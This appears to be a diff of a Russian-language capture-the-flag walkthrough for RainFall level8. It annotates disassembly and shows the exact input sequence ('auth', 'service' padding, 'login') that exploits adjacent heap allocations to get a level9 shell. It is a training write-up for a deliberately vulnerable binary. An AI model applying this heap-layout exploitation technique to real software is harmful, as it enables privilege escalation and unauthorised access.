@@ -227,10 +227,10 @@ if (!=0)
    0x080486dc <+376>:   jne    0x8048574 <main+16>	// если не равно, то переход на смещение +16
 
 if (==)
-   0x080486e2 <+382>:   mov    0x8049aac,%eax 		// записать адрес переменной "auth" в регистр EAX
-   0x080486e7 <+387>:   mov    0x20(%eax),%eax 		// скопировать значение по адресу EAX+32 в EAX
-   0x080486ea <+390>:   test   %eax,%eax  		// сравнение буфера по маске
-   0x080486ec <+392>:   je     0x80486ff <main+411> 	// если не равно, то переход на смещение +16
+   0x080486e2 <+382>:   mov    0x8049aac,%eax		// записать адрес переменной "auth" в регистр EAX
+   0x080486e7 <+387>:   mov    0x20(%eax),%eax		// скопировать значение по адресу EAX+32 в EAX
+   0x080486ea <+390>:   test   %eax,%eax		// сравнение буфера по маске
+   0x080486ec <+392>:   je     0x80486ff <main+411>	// если не равно, то переход на смещение +16
 
    
    0x080486ee <+394>:   movl   $0x8048833,(%esp)	// Entry point!: 0x8048833 - /bin/sh
@@ -255,7 +255,7 @@ fwrite(&"Password:\n", 1, 10, stdout);
    0x08048735 <+465>:   pop    %esi
    0x08048736 <+466>:   pop    %edi
    0x08048737 <+467>:   pop    %ebp
-   0x08048738 <+468>:   ret    				// выход
+   0x08048738 <+468>:   ret				// выход
 
 
 # Выводы дизассемллирования
@@ -285,16 +285,34 @@ fwrite(&"Password:\n", 1, 10, stdout);
 The  strdup()  function returns a pointer to a new string which is a duplicate of the string s. 
 Memory for the new string is obtained with malloc(3), and can be freed with free(3).
 
-Она выделяет память на куче и мы можем дописать в переменную auth дополнительно символов. 
+Так как в коде есть два вызова malloc(), первый для "auth ", второй вызывается для "service***", память при их вызовах выделяется на куче последовательно для "auth ", затем для того, что следует за словом "service". Обращение auth[32] "заглядывает" в последующую за auth выделенную на куче память. Соответственно, мы можем выделить достаточное количество памяти на куче (>= 26 байт), путем одного или нескольких подач строки на стандартный ввод с "service".
 
 
 # Атака:
 
+level8@RainFall:~$ ./level8 
 (nil), (nil) 
 auth 
-0x8e829c0, (nil) 
+0x804a008, (nil) 
 serviceAAAAAAAAAAAAAAAAAAAA
-0x8e829c0, 0x8e829d0 
+0x804a008, 0x804a018 
 login
-$ ls
-flag  level8  source.c  walkthrough
+$ whoami
+level9
+
+или 
+
+level8@RainFall:~$ ./level8 
+(nil), (nil) 
+auth 
+0x804a008, (nil) 
+service 
+0x804a008, 0x804a018 
+service 
+0x804a008, 0x804a028 
+service 
+0x804a008, 0x804a038 
+login
+$ whoami
+level9
+
